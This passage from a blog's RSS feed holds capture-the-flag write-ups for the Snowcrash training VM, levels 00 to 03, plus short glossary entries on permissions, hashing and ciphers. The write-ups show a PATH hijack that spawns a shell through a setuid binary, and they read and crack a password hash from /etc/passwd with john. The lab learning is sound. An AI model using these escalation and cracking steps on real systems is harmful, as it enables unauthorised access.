<tr>
<td><strong>PWD</strong></td>
<td>the current working directory</td>
</tr>
</tbody>
</table>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Environment_variable">wikipedia</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>What is File Permission</title>
            <link>/posts/glossary/file_permission/</link>
            <pubDate>Sun, 02 Aug 2020 17:02:49 +0200</pubDate>
            
            <guid>/posts/glossary/file_permission/</guid>
            <description>Each file as his own permission set.
It allow to
 control the ability of the users to view, change, navigate, and execute the contents of the file system
 Notation for Unix system permission can be see in its symbolic notation using ls -l
$ ls -l total 16 -rw-rw-r-- 1 level03 level03 0 Aug 2 17:22 foo with ls -l the 1st column is used to represent the file type and his permission.</description>
            <content type="html"><![CDATA[<p>Each file as his own permission set.<br>
It allow to</p>
<blockquote>
<p>control the ability of the users to view, change, navigate, and execute the contents of the file system</p>
</blockquote>
<h2 id="notation-for-unix-system">Notation for Unix system</h2>
<p>permission can be see in its symbolic notation using <code>ls -l</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -l
total <span style="color:#ae81ff">16</span>
-rw-rw-r-- <span style="color:#ae81ff">1</span> level03 level03    <span style="color:#ae81ff">0</span> Aug  <span style="color:#ae81ff">2</span> 17:22 foo
</code></pre></div><p>with <code>ls -l</code> the 1st column is used to represent the file type and his permission.</p>
<pre><code>[-][rw-rw-r--]
 ^  ^
 │  │
 │  └─ file permission
 └─ file type
</code></pre><p>the file permission group is composed of 3 triad each one represented one group:<br>
<code>User</code> / <code>Group</code> / <code>Other</code></p>
<pre><code>[rw-][rw-][r--]
 ^    ^    ^
 │    │    └─ Other
 │    └─ Group
 └─ User
</code></pre><table>
<thead>
<tr>
<th>Letter</th>
<th>Location</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>1st letter of each triad</td>
<td>allow the triad&rsquo;s group to <strong>READ</strong> the file</td>
</tr>
<tr>
<td>w</td>
<td>2nd letter of each triad</td>
<td>allow the triad&rsquo;s group to <strong>MODIFY</strong> the file</td>
</tr>
<tr>
<td>x</td>
<td>3rd letter of each triad</td>
<td>allow the triad&rsquo;s group to <strong>EXECUTE</strong> the file</td>
</tr>
<tr>
<td>s</td>
<td>3rd letter of <code>User</code> triad</td>
<td>allow the user to run the file with the system permissions of the <strong>OWNER</strong></td>
</tr>
<tr>
<td>s</td>
<td>3rd letter of <code>Group</code> triad</td>
<td>allow the user to run the file with the system permissions of the <strong>GROUP</strong></td>
</tr>
<tr>
<td>t</td>
<td>3rd letter of <code>Other</code> triad</td>
<td>only the <strong>owner</strong> or <strong>root</strong> can <strong>RENAME</strong> or <strong>DELETE</strong> the file</td>
</tr>
<tr>
<td>S</td>
<td>3rd letter of <code>User</code> / <code>GROUP</code> triad</td>
<td>like <code>s</code>, but the executable bit is disabled</td>
</tr>
<tr>
<td>T</td>
<td>3rd letter of <code>Other</code> triad</td>
<td>like <code>t</code>, but the executable bit is disabled</td>
</tr>
<tr>
<td>-</td>
<td>any</td>
<td>the corresponding permission is disabled</td>
</tr>
</tbody>
</table>
<p>with our previous example <code>foo</code> give the following permission:</p>
<ul>
<li>for the owner of the file to <strong>READ</strong> and <strong>WRITE</strong></li>
<li>for the group to <strong>READ</strong> and <strong>WRITE</strong></li>
<li>and for the rest to access the file has <strong>READONLY</strong></li>
</ul>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/File_system_permissions">file permission - wiki</a></li>
<li><a href="https://en.wikipedia.org/wiki/Setuid">Setuid &amp; Setgid - wiki</a></li>
<li><a href="https://en.wikipedia.org/wiki/Sticky_bit">Sticky bit - wiki</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level03</title>
            <link>/posts/snowcrash/level03/</link>
            <pubDate>Sun, 02 Aug 2020 15:06:27 +0200</pubDate>
            
            <guid>/posts/snowcrash/level03/</guid>
            <description>On the Home directory of level03 we have an executable file with the setuid file permission set
$ ls -l total 12 -rwsr-sr-x 1 flag03 level03 8627 Mar 5 2016 level03 Analyzing level03 By using the debugger gdb, we can disassemble level03 and inspect his ASM code.
1 2 3 4 5 6 7 8 9 10 11 12  $ gdb level03 -q Reading symbols from level03...done. Dump of assembler code for function main: (gdb) disas main .</description>
            <content type="html"><![CDATA[<p>On the Home directory of <code>level03</code> we have an executable file with the <strong>setuid</strong> <a href="/posts/glossary/file_permission">file permission</a> set</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -l
total <span style="color:#ae81ff">12</span>
-rwsr-sr-x <span style="color:#ae81ff">1</span> flag03 level03 <span style="color:#ae81ff">8627</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2016</span> level03
</code></pre></div><h2 id="analyzing-level03">Analyzing level03</h2>
<p>By using the debugger <code>gdb</code>, we can disassemble <code>level03</code> and inspect his <strong>ASM</strong> code.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="display:block;width:100%;background-color:#3c3d38"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span></span><span style="display:block;width:100%;background-color:#3c3d38"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="display:block;width:100%;background-color:#3c3d38"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ gdb level03 -q
Reading symbols from level03...done.
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disas main
   ...
<span style="display:block;width:100%;background-color:#3c3d38">   0x080484f7 &lt;+83&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,0x80485e0
</span><span style="display:block;width:100%;background-color:#3c3d38">   0x080484fe &lt;+90&gt;:	call   0x80483b0 &lt;system@plt&gt;
</span>   0x08048503 &lt;+95&gt;:	leave
   0x08048504 &lt;+96&gt;:	ret
End of assembler dump.
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/s 0x80485e0
<span style="display:block;width:100%;background-color:#3c3d38">0x80485e0:	<span style="color:#e6db74">&#34;/usr/bin/env echo Exploit me&#34;</span>
</span></code></pre></td></tr></table>
</div>
</div><p>We jump to what we are interesting in, the <code>system</code> call.<br>
Put it together, we get the following line in <code>C</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">system(<span style="color:#e6db74">&#34;/usr/bin/env echo Exploit me&#34;</span>);
</code></pre></div><h2 id="exploiting-the-executable">Exploiting the executable</h2>
<p>As you can see, we can exploit the <code>system</code> call and making it execute arbitrary code by modifying the <code>PATH</code> <a href="/posts/glossary/env_table">env variable</a>.</p>
<p>With the following example, I manage the execute a shell with the right of <code>flag03</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ mkdir /tmp/03
$ cd /tmp/03
$ echo <span style="color:#e6db74">&#34;/bin/sh&#34;</span> &gt; echo
$ cd
$ <span style="color:#75715e"># We add our dir in first of PATH, so our echo who is executed</span>
$ PATH<span style="color:#f92672">=</span>/tmp/03:$PATH ./level03
$ whoami
flag03
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level02</title>
            <link>/posts/snowcrash/level02/</link>
            <pubDate>Fri, 31 Jul 2020 19:28:20 +0200</pubDate>
            
            <guid>/posts/snowcrash/level02/</guid>
            <description>$ file level02.pcap level02.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 16777216) level02.pcap is a file that contains tcp packets. I will use Wireshark to read the file
just by looking at the tcp stream, we see that the user as enter a password ( but beware of special chars )
we can use that password to connect as flag02
What is Wireshark Wireshark is a packet analyzer tool used for network analysis</description>
            <content type="html"><![CDATA[<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ file level02.pcap
level02.pcap: tcpdump capture file <span style="color:#f92672">(</span>little-endian<span style="color:#f92672">)</span> - version 2.4 <span style="color:#f92672">(</span>Ethernet, capture length 16777216<span style="color:#f92672">)</span>
</code></pre></div><p><code>level02.pcap</code> is a file that contains tcp packets. I will use <strong>Wireshark</strong> to read the file</p>

    <img src="img/wireshark.png"  class="left"  />


<p>just by looking at the <strong>tcp stream</strong>, we see that the user as enter a password ( but beware of special chars )</p>
<p>we can use that password to connect as <code>flag02</code></p>
<h2 id="what-is-wireshark">What is Wireshark</h2>
<p><strong>Wireshark</strong> is a packet analyzer tool used for network analysis</p>
]]></content>
        </item>
        
        <item>
            <title>What is Rainbow table</title>
            <link>/posts/glossary/rainbow_table/</link>
            <pubDate>Tue, 28 Jul 2020 22:10:15 +0200</pubDate>
            
            <guid>/posts/glossary/rainbow_table/</guid>
            <description>A Rainbow table is a table of precomputed-hash values generated from hash function. It is generaly used to crack password.
Source  wikipedia  </description>
            <content type="html"><![CDATA[<p>A <strong>Rainbow table</strong> is a table of precomputed-hash values generated from <a href="/posts/glossary/hash_function">hash function</a>.
It is generaly used to crack password.</p>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Rainbow_table">wikipedia</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>What is Brute Force Attack</title>
            <link>/posts/glossary/brute_force/</link>
            <pubDate>Tue, 28 Jul 2020 22:10:10 +0200</pubDate>
            
            <guid>/posts/glossary/brute_force/</guid>
            <description>In cryptography, a brute force attack is when an attacker submit as many as possible passwords with the hope to guess the right password
Source  wikipedia  </description>
            <content type="html"><![CDATA[<p>In cryptography, a <strong>brute force attack</strong> is when an attacker submit as many as possible passwords
with the hope to guess the right password</p>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Brute-force_attack">wikipedia</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>What is Hash Function</title>
            <link>/posts/glossary/hash_function/</link>
            <pubDate>Tue, 28 Jul 2020 21:48:30 +0200</pubDate>
            
            <guid>/posts/glossary/hash_function/</guid>
            <description>an hash function is a function that can take data of arbitrary size and output data to fixed size. the output of an hash function is called:
 hash value hashes digest  For example a hash function can be used to map name to index in a fixed-size table ( hash table ) we call this process hashing
Source  wikipedia  </description>
            <content type="html"><![CDATA[<p>an <strong>hash function</strong> is a function that can take data of <strong>arbitrary size</strong> and output data to <strong>fixed size</strong>.
the output of an hash function is called:</p>
<ul>
<li>hash value</li>
<li>hashes</li>
<li>digest</li>
</ul>
<p>For example a <strong>hash function</strong> can be used to map name to index in a fixed-size table ( hash table ) we call this process hashing</p>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Hash_function">wikipedia</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level01</title>
            <link>/posts/snowcrash/level01/</link>
            <pubDate>Tue, 28 Jul 2020 21:36:02 +0200</pubDate>
            
            <guid>/posts/snowcrash/level01/</guid>
            <description>when looking the file /etc/passwd, we see that the user flag01 has is hash password written in the deprecated password column
$ grep flag01 /etc/passwd flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash It exist some tools to decrypt hash that used different attack method like brute force or wordlist. I will use john for this level.
we extract the line that contains the hash to password.txt
$ ssh -p 4242 level01@snowcrash grep flag01 /etc/passwd &amp;gt; password.txt [ .</description>
            <content type="html"><![CDATA[<p>when looking the file <code>/etc/passwd</code>, we see that the user <strong>flag01</strong> has is <a href="/posts/glossary/hash_function">hash</a> password written in the <em>deprecated password column</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ grep flag01 /etc/passwd
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
</code></pre></div><p>It exist some tools to decrypt hash that used different attack method like <a href="/posts/glossary/brute_force">brute force</a> or <a href="/posts/glossary/ranbow_table">wordlist</a>.
I will use <code>john</code> for this level.</p>
<p>we extract the line that contains the hash to <code>password.txt</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ssh -p <span style="color:#ae81ff">4242</span> level01@snowcrash grep flag01 /etc/passwd &gt; password.txt
<span style="color:#f92672">[</span> ... output omitted ... <span style="color:#f92672">]</span>
</code></pre></div><p>then we execute <code>john</code> to decrypt the password</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ /usr/sbin/john password.txt
Using default input encoding: UTF-8
<span style="color:#f92672">[</span> ... output omitted ... <span style="color:#f92672">]</span>
1g 0:00:00:00 DONE 2/3 <span style="color:#f92672">(</span>2020-08-02 14:13<span style="color:#f92672">)</span> 10.00g/s 89740p/s 89740c/s 89740C/s 123456..nutmegs
Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</code></pre></div><p>and that its, we get the password to connect to <code>flag01</code> and get the flag</p>
<h2 id="more-about-how-linux-save-password-of-users">More about how linux save password of users</h2>
<p>the older version of linux was storing the password in the file <code>/etc/passwd</code>.
now linux store user account and password separately in <code>/etc/passwd</code> and <code>/etc/shadow</code> respectively</p>
]]></content>
        </item>
        
        <item>
            <title>What is Rot Permutation</title>
            <link>/posts/glossary/rot_permutation/</link>
            <pubDate>Tue, 28 Jul 2020 18:38:17 +0200</pubDate>
            
            <guid>/posts/glossary/rot_permutation/</guid>
            <description>a Rot Permutation or Cesar Permutation is a method to transform a phrase into another by permuting char with another n-th letter
generally we add the amount of rotation to the function name:
 rotXX | rot-XX where XX is the rotation count
 Example     1 5 10 13 26 &amp;hellip;     a b f k n a &amp;hellip;   b c g l o b &amp;hellip;   c d h m p c &amp;hellip;   &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip;    with rot13 hello world become uryyb jbeyq</description>
            <content type="html"><![CDATA[<p>a Rot Permutation or Cesar Permutation is a method to transform a phrase into another
by permuting char with another n-th letter</p>
<p>generally we add the amount of rotation to the function name:</p>
<blockquote>
<p>rotXX | rot-XX where XX is the rotation count</p>
</blockquote>
<h2 id="example">Example</h2>
<table>
<thead>
<tr>
<th></th>
<th>1</th>
<th>5</th>
<th>10</th>
<th>13</th>
<th>26</th>
<th>&hellip;</th>
</tr>
</thead>
<tbody>
<tr>
<td>a</td>
<td>b</td>
<td>f</td>
<td>k</td>
<td>n</td>
<td>a</td>
<td>&hellip;</td>
</tr>
<tr>
<td>b</td>
<td>c</td>
<td>g</td>
<td>l</td>
<td>o</td>
<td>b</td>
<td>&hellip;</td>
</tr>
<tr>
<td>c</td>
<td>d</td>
<td>h</td>
<td>m</td>
<td>p</td>
<td>c</td>
<td>&hellip;</td>
</tr>
<tr>
<td>&hellip;</td>
<td>&hellip;</td>
<td>&hellip;</td>
<td>&hellip;</td>
<td>&hellip;</td>
<td>&hellip;</td>
<td>&hellip;</td>
</tr>
</tbody>
</table>
<p>with rot13 <code>hello world</code> become <code>uryyb jbeyq</code></p>
]]></content>
        </item>
        
        <item>
            <title>What is Ctf</title>
            <link>/posts/glossary/ctf/</link>
            <pubDate>Mon, 27 Jul 2020 23:14:17 +0200</pubDate>
            
            <guid>/posts/glossary/ctf/</guid>
            <description>CTF stand for Capture The Flag(s).
It&amp;rsquo;s a type of game/exercise were you, the player need to find the flag.
The flag is generally a string, but it can represented in other way.</description>
            <content type="html"><![CDATA[<p>CTF stand for Capture The Flag(s).</p>
<p>It&rsquo;s a type of game/exercise were you, the player need to find the flag.</p>
<p>The flag is generally a string, but it can represented in other way.</p>
]]></content>
        </item>
        
        <item>
            <title>What is Vm</title>
            <link>/posts/glossary/vm/</link>
            <pubDate>Mon, 27 Jul 2020 23:03:11 +0200</pubDate>
            
            <guid>/posts/glossary/vm/</guid>
            <description>VM stand for Virtual Machine, it&amp;rsquo;s a &amp;ldquo;machine&amp;rdquo; that will be run inside another machine. Crazy right ?
To use a virtual Machine we some software like VirtualBox or VMWare</description>
            <content type="html"><![CDATA[<p>VM stand for Virtual Machine, it&rsquo;s a &ldquo;machine&rdquo; that will be run inside another machine.
Crazy right ?</p>
<p>To use a virtual Machine we some software like VirtualBox or VMWare</p>
]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level00</title>
            <link>/posts/snowcrash/level00/</link>
            <pubDate>Mon, 27 Jul 2020 22:51:34 +0200</pubDate>
            
            <guid>/posts/snowcrash/level00/</guid>
            <description>on connection to level00, we arrive on a empty home directory
An interesting file because we don&amp;rsquo;t have any file present in the home directory, we search for file related to the user flag00, our target.
first we search for with flag00 as owner
$ find / -user flag00 2&amp;gt;/dev/null /usr/sbin/john /rofs/usr/sbin/john Cesar, my old friend The file /usr/sbin/john contains a odd string but its not our password.
$ cat /usr/sbin/john cdiiddwpgswtgt  The filename john refer to a tool to find weak passwords of your users.</description>
            <content type="html"><![CDATA[<p>on connection to level00, we arrive on a empty home directory</p>
<h2 id="an-interesting-file">An interesting file</h2>
<p>because we don&rsquo;t have any file present in the home directory, we search for file related to the user <strong>flag00</strong>, our target.</p>
<p>first we search for with <strong>flag00</strong> as owner</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ find / -user flag00 2&gt;/dev/null
/usr/sbin/john
/rofs/usr/sbin/john
</code></pre></div><h2 id="cesar-my-old-friend">Cesar, my old friend</h2>
<p>The file <code>/usr/sbin/john</code> contains a odd string but its not our password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat /usr/sbin/john
cdiiddwpgswtgt
</code></pre></div><blockquote>
<p>The filename <code>john</code> refer to <em>a tool to find weak passwords of your users</em>.</p>
</blockquote>
<p>So the string we found must be decoded first, I go to <a href="https://www.dcode.fr/chiffre-rot">dcode root-n</a> to decode the string using the <a href="/posts/glossary/root_permutation">root permutation</a> method.</p>
<p>With an automatic decode we found an interesting string.</p>
<p>We connect to <strong>flag00</strong> using <code>su flag00</code> with the decoded string, and voila we can get the flag</p>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://www.dcode.fr">dcode.fr</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Snowcrash</title>
            <link>/posts/snowcrash/</link>
            <pubDate>Mon, 27 Jul 2020 22:43:44 +0200</pubDate>
            
            <guid>/posts/snowcrash/</guid>
            <description>Introduction Snowcrash is a VM in the style of a CTF.
You have 14 level to complete and get each flags
Summary  Level00: You lost something ? Level01: John, can you give me the flag ? Level02: I want a soda with my shark. Level03: Echo from the past. Level04: I found a Perl. Level05: A fight in the arena. Level06: Replace the elephant. Level07: You can&amp;rsquo;t log me. Level08: Can you read a link ?</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>Snowcrash is a <a href="/posts/glossary/vm">VM</a> in the style of a <a href="/posts/glossary/ctf">CTF</a>.</p>
<p>You have 14 level to complete and get each flags</p>
<h2 id="summary">Summary</h2>
<ul>
<li><a href="/posts/snowcrash/level00">Level00</a>: You lost something ?</li>
<li><a href="/posts/snowcrash/level01">Level01</a>: John, can you give me the flag ?</li>
<li><a href="/posts/snowcrash/level02">Level02</a>: I want a soda with my shark.</li>
<li><a href="/posts/snowcrash/level03">Level03</a>: Echo from the past.</li>
<li><a href="/posts/snowcrash/level04">Level04</a>: I found a Perl.</li>
<li><a href="/posts/snowcrash/level05">Level05</a>: A fight in the arena.</li>
<li><a href="/posts/snowcrash/level06">Level06</a>: Replace the elephant.</li>
<li><a href="/posts/snowcrash/level07">Level07</a>: You can&rsquo;t log me.</li>
<li><a href="/posts/snowcrash/level08">Level08</a>: Can you read a link ?</li>
<li><a href="/posts/snowcrash/level09">Level09</a>: That escalated quickly</li>
<li><a href="/posts/snowcrash/level10">Level10</a>: I request the flag.</li>
<li><a href="/posts/snowcrash/level11">Level11</a>: Sorry, wrong password !</li>
<li><a href="/posts/snowcrash/level12">Level12</a>: Grep 101</li>
<li><a href="/posts/snowcrash/level13">Level13</a>: Jump, Jump</li>
<li><a href="/posts/snowcrash/level14">Level14</a>: I get the flag.</li>
</ul>
]]></content>
        </item>
        
    </channel>
</rss>
